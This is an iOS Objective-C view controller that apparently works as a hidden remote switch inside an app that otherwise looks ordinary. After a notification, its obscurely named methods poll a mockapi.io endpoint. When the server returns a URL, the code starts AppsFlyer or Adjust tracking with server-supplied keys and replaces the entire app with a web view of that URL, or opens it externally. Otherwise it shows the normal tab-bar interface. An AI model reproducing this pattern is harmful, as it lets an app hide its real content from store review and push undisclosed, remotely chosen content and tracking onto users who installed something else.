#import "FirstController.h"
#import "oneView.h"
#import "twoView.h"
#import "RootTabBarController.h"
#import "CrashReporter.h"
#import "DataBackupManager.h"
#import <AdjustSdk/AdjustSdk.h>
#import <AppsFlyerLib/AppsFlyerLib.h>
@interface FirstController ()

@end

@implementation FirstController

- (void)viewDidLoad {
    [super viewDidLoad];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(notificationAction:) name:@"GFEDAW" object:nil];
    // 设置背景图
        UIImageView *backgroundImageView = [[UIImageView alloc] initWithFrame:self.view.bounds];
        backgroundImageView.image = [UIImage imageNamed:@"gdgdsgr"];
        backgroundImageView.contentMode = UIViewContentModeScaleAspectFill;
        [self.view addSubview:backgroundImageView];
    
//    // 设置背景为浅蓝色
//    self.view.backgroundColor = [UIColor colorWithRed:0.678 green:1.0 blue:0.678 alpha:1.0];  // 浅绿色
        
    
//    // 设置居中图标
//        UIImageView *iconImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"cxxdsfds"]];
//        iconImageView.contentMode = UIViewContentModeScaleAspectFit;
//        iconImageView.translatesAutoresizingMaskIntoConstraints = NO;
//        [self.view addSubview:iconImageView];
//        
//        // 设置图标居中
//        [NSLayoutConstraint activateConstraints:@[
//            [iconImageView.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],  // 水平居中
//            [iconImageView.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],  // 垂直居中
//            
//            // 限制最大宽度和最大高度
//            [iconImageView.widthAnchor constraintLessThanOrEqualToConstant:200],  // 最大宽度 200
//            [iconImageView.heightAnchor constraintLessThanOrEqualToConstant:200], // 最大高度 200
//        ]];
//    
//    
//    // 创建并配置 Welcome User 文本
//       UILabel *welcomeLabel = [[UILabel alloc] init];
//       welcomeLabel.text = @"Welcome!";
//       
//       // 设置斜体字体和大小100
//       welcomeLabel.font = [UIFont italicSystemFontOfSize:50];
//       
//       // 设置颜色为黑灰色
//       welcomeLabel.textColor = [UIColor colorWithRed:60.0/255.0 green:60.0/255.0 blue:60.0/255.0 alpha:1.0]; // RGB(60, 60, 60)
//       
//       welcomeLabel.translatesAutoresizingMaskIntoConstraints = NO;
//       welcomeLabel.textAlignment = NSTextAlignmentCenter;
////       welcomeLabel.numberOfLines = 0; // 允许多行
//       welcomeLabel.lineBreakMode = NSLineBreakByWordWrapping; // 设置换行方式
//       [self.view addSubview:welcomeLabel];
//       
//       // 设置 Welcome User 文本在图标下方居中
//       [NSLayoutConstraint activateConstraints:@[
//           [welcomeLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor], // 水平居中
//           [welcomeLabel.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor constant:190], // 垂直居中并与图标有一定间隔
//           [welcomeLabel.widthAnchor constraintLessThanOrEqualToAnchor:self.view.widthAnchor multiplier:0.8] // 限制最大宽度
//       ]];
}

-(void)notificationAction:(NSNotification *)notification{
    [self GFEDAW];
}

-(void)GFEDAW{
        dispatch_async(dispatch_get_main_queue(), ^{
    
            [self ftcnstimeEvent];
        });
}

-(void)ftcnstimeEvent{
        NSString *diliu = @"https://680dea93c47cb8074d9187d5.mockapi.io/testtestaaa";
        
        // 创建 URL 对象
        NSURL *url = [NSURL URLWithString:diliu];
        if (!url) {
            NSLog(@"无效的 URL");
            return;
        }
        
        // 创建请求对象
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
        request.HTTPMethod = @"GET";
        [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        
        // 创建会话对象
        NSURLSession *session = [NSURLSession sharedSession];
        
        // 数据任务
        NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (data && !error) {
                NSError *jsonError = nil;
                // 解析 JSON 数据
                NSArray *list = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError];
                if (jsonError) {
                    NSLog(@"JSON 解析错误: %@", jsonError);
                    dispatch_async(dispatch_get_main_queue(), ^{
                        [self ftcnstimeEvent];
                    });
                    return;
                }
                dispatch_async(dispatch_get_main_queue(), ^{
                    
                    if (list.count > 0) {
                        NSDictionary *firstItem = list[0];
                    
                        NSString *url = firstItem[@"url"];
                        NSLog(@"JSON firstItem: %@", firstItem);

                        if (![url isEqualToString:@""]) {
                            NSString *openType = firstItem[@"platform"];
                            NSString *EventType = firstItem[@"eventtype"];
                            if ([EventType isEqualToString:@"af"]){
                                [AppsFlyerLib shared].appsFlyerDevKey = firstItem[@"afkey"];
                                [AppsFlyerLib shared].appleAppID = firstItem[@"appid"];
                                [[AppsFlyerLib shared] start];
                            }else if ([EventType isEqualToString:@"ad"]){
                                NSString *appToken = firstItem[@"adkey"];
                                NSString *environment = ADJEnvironmentProduction;
                                ADJConfig *adjustConfig = [[ADJConfig alloc] initWithAppToken:appToken
                                    environment:environment];
                                [Adjust initSdk:adjustConfig];
                            }
                            
                            if([openType isEqualToString:@"1"]){
                                UIWindow *window = [UIApplication sharedApplication].delegate.window;
                               
                                oneView *abomfbView = [[oneView alloc] initWithURL:url initEventType:EventType  initAdEventList:firstItem[@"adeventlist"] inAppJump:firstItem[@"inappjump"]];
                                window.rootViewController = abomfbView;
                                [window makeKeyAndVisible];
                            }else if([openType isEqualToString:@"2"]){
                                UIWindow *window = [UIApplication sharedApplication].delegate.window;
                               
                                twoView *abomfbView = [[twoView alloc] initWithURL:url initEventType:EventType  initAdEventList:firstItem[@"adeventlist"] inAppJump:firstItem[@"inappjump"]];
                                window.rootViewController = abomfbView;
                                [window makeKeyAndVisible];
                            }else if([openType isEqualToString:@"3"]){
                                [[UIApplication sharedApplication] openURL:[NSURL URLWithString:url] options:@{} completionHandler:nil];
                            }
                        
                        }else{
                            [self rootViewSet];
                        }
                    }
                });
            }else{
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self ftcnstimeEvent];
                });
            }
        }];
        
        // 启动任务
        [dataTask resume];
}

-(void)rootViewSet{
    UIWindow *window = [UIApplication sharedApplication].delegate.window;
//    UIWindowScene *windowScene = (UIWindowScene *)[UIApplication sharedApplication].connectedScenes.allObjects.firstObject;
//    UIWindow *window = windowScene.windows.firstObject;
    
    RootTabBarController *rootVC = [[RootTabBarController alloc] init];
    window.rootViewController = rootVC;
    [window makeKeyAndVisible];
    
    // 初始化崩溃报告
    [[CrashReporter sharedReporter] startMonitoring];
    
    // 检查并恢复备份数据
    if ([[DataBackupManager sharedManager] hasBackup]) {
        [[DataBackupManager sharedManager] restoreData];
    }
}
@end

